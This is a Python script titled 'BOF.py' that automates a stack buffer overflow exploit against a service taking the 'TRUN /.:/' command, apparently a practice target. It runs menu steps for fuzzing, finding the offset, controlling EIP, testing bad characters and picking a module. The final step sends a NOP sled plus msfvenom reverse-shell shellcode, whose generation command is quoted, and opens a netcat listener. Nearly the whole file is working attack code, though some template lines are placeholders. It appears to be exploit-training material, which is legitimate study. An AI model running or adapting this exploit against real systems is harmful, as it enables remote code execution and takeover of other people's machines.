#!/bin/python
# -*- coding: utf-8 -*- 

from tqdm import tqdm
import sys
import socket 
import os


loop = tqdm(total = 5000, position=0, leave=False)
for k in range(5000):
	loop.set_description("Loading..." .format(k))
	loop.update(1)
loop.close()


print('''
 ___________________
 | _______________ |
 | |XXXXXXXXXXXXX| |
 | |XX  XXXXX  XX| |		BOF.py
 | |XXXXXXXXXXXXX| |		By: Liam Wood
 | |XXXX     XXXX| |		
 | |XXXXXXXXXXXXX| |
 |_________________|
     _[_______]_
 ___[___________]___
|         [_____] []|
|         [_____] []|
L___________________J    

''')

print("-" * 50)
print("1. FUZZING")
print("2. OFFSET")
print("3. EIP")
print("4. BAD CHARS")
print("5. FIND RIGHT MODULE")
print("6. ROOT")
print("-" * 50)
ip=input('Enter IP:')
port=input("Enter port: ")
options=int(input ("Enter Number: "))  
print("-" * 50)

if options == 1 :

	length = int(input('Length of attack: '))
	buffer = b"A" * length                

	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip ,(int(port))))

		s.send((b'TRUN /.:/' + (buffer)))
		s.close()
			
	except:
		print ("successfully crashed") 
		sys.exit()

if options == 2 :

	off = input("Entter pattern: ")
	line = "	s.connect(('" +ip+  "',"+port+"))"
	offs = "offset='"+off+"'"
	with open('offset.py', 'w') as f:
		f.write('''
#!/usr/bin/python

import sys
import socket 
	 
offset=""

try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((' ', ))

        s.send(('TRUN /.:/' + offset)) 
        s.close()

except:
        print ("error connecting to server")
        sys.exit()


''')

	a_file = open("EIP.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[6]= offs
	
	a_file = open("EIP.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	

	a_file = open("EIP.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[9]= line


	a_file = open("EIP.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	os.system("python offset.py")
	
if options == 3 :
	
	E = input("Enter offset: ")
	eip = 'shellcode = b"A"*'+E+' + b"B"*4 + b"C"*(1400-515-4)'
	line = "	s.connect(('" +ip+  "',"+port+"))"

	with open('EIP.py', 'w') as f:
		f.write('''
#!/usr/bin/python

import sys
import socket 

shellcode = b"A"*515 + b"B"*4 + b"C"*(1400-515-4)

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	#
	s.send((b'TRUN /.:/' + shellcode)) 
	s.close()

except:
	print ('error connecting to server')
	sys.exit()

''')

	a_file = open("EIP.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[6]= eip
	
	a_file = open("EIP.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	a_file = open("EIP.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[9]= line

	a_file = open("EIP.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	os.system("python EIP.py")

if options == 4 :
	
	off = input("Enter offset agine plz: ")
	line = "	s.connect(('" +ip+  "',"+port+"))\n"
	offset = "shellcode = 'A' * "+off+" + 'B' * 4 + badchars\n"
	

	a_file = open("badchar.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[27]= line


	a_file = open("badchar.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	a_file = open("badchar.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[23]= offset


	a_file = open("badchar.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	os.system("python badchar.py")
	

if options == 5 :

	off = input("Plz enter offset agine: ") 
	chara = input("Enter (x00) characters: ")
	line = "	s.connect(('" +ip+  "',"+port+"))\n"
	ch = "shellcode = 'A' * "+off+" + '"+chara+"' + 'C'*(1400-515-4)\n"

	a_file = open("module.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[5]= ch


	a_file = open("module.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	a_file = open("module.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[9]= line


	a_file = open("module.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	os.system("python module.py")
	


if options == 6 :
	
	
	off = input("Plz enter offset agine: ") 
	chara = input("Enter (x00) characters: ")
	line = "	s.connect(('" +ip+  "',"+port+"))\n"
	num = r"\x"
	ch = "shellcode = 'A' * "+off+" + '"+chara+"' + '"+num+"90'*32 + buf\n"

	
	
	with open('shell.py', 'w') as f:
		f.write(r'''
#!/usr/bin/python

import sys
import socket 

buf = ("")

shellcode = 'A' * werh + 'er' + '\x90'*32 + buf

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('ewrtt',wert))
	s.send(('TRUN /.:/' + shellcode)) 
	s.close()


except:
	print ('error connecting to server')
	sys.exit()

''')
  	
  	
	

	a_file = open("shell.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[8]= ch


	a_file = open("shell.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	a_file = open("shell.py", "r")
	list_of_lines = a_file.readlines()
	list_of_lines[12]= line


	a_file = open("shell.py", "w")
	a_file.writelines(list_of_lines)
	a_file.close()
	
	print("Go to shel.py and enter the shell code and then continue")
	print("Example to get shell code: msfvenom -p windows/shell_reverse_tcp LHOST=(IP)LPORT=(port)AppendExit=true -f c -a x86 -b 'x00'") 
	ell = input("Type yes to run exploit: ")
	
	if ell == "yes" :
		
		lport = input("Enter LPORT:") 	
		os.system("python shell.py")
		print("-" * 50)
		os.system("nc -nvlp "+lport+"")
		
		
	
	


  	
  	
  	
  	
  	
  	
  	
  	
  	
